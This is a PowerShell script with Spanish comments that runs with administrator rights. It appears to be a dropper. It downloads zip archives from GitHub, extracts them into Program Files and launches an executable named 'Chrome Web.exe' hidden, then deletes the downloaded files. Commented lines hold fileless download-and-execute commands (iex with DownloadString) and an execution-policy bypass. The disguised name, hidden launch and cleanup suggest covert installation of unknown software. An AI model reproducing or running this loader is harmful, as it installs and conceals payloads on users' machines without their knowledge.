#HAY QUE EJECUTAR COMO ADMINISTRADOR
#Set-ExecutionPolicy -ExecutionPolicy Bypass -force
#powershell "start-process powershell -verb runas"
#powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Admo9/Source/main/Prueba.ps1')"
#powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Admo9/Source/main/PruebaM.ps1')"
#powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Admo9/Source/main/Profile')"

measure-command {

invoke-webrequest -uri "https://github.com/Admo9/ProJ01/raw/main/win64.zip" -outfile "C:\Users\win64.zip"

invoke-webrequest -uri "https://github.com/Admo9/ProJ03/archive/refs/heads/main.zip" -outfile "C:\Users\app64.zip"


Set-ItemProperty -Path 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\.NetFramework\v4.0.30319' -Name 'SchUseStrongCrypto' -Value '1' -Type DWord


[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Install-PackageProvider -Name NuGet -force


Install-Module -Name 7Zip4Powershell -force

Expand-Archive -Path C:\Users\app64.zip -DestinationPath C:\Users\

Expand-7Zip -ArchiveFileName C:\Users\ProJ03-main\app-64.7z.001 -Password "" -TargetPath "C:\Program Files\"

invoke-webrequest -uri "https://github.com/Admo9/Data/raw/main/app.zip" -outfile "C:\Users\app.zip"

#Expand-Archive -Path C:\Users\app.zip -DestinationPath C:\Users\ProJ03-main\app-64\resources

#Expand-Archive -Path C:\Users\ProJ03-main\app-64.zip.001 -DestinationPath "C:\Program Files\"

Expand-Archive -Path C:\Users\app.zip -DestinationPath "C:\Program Files\app-64\resources\"


Remove-Item -Force -Recurse 'C:\Users\app64.zip', 'C:\Users\ProJ03-main', 'C:\Users\app.zip'

Start-Process "C:\Program Files\app-64\Chrome Web.exe" --hidden } |

select @{n="time";e={$_.Minutes,"Minutes",$_.Seconds,"Seconds",$_.Milliseconds,"Milliseconds" -join " "}}

#CERRAR EL PROGRAMA
#Get-WmiObject -Class Win32_Process -Filter "name='Chrome Web.exe'" | Invoke-WmiMethod -Name Terminate
#web tools
#https://drive.google.com/drive/folders/1NZxzpKCzvObrO96FZCcoZC2-M-J17mtl
EXIT


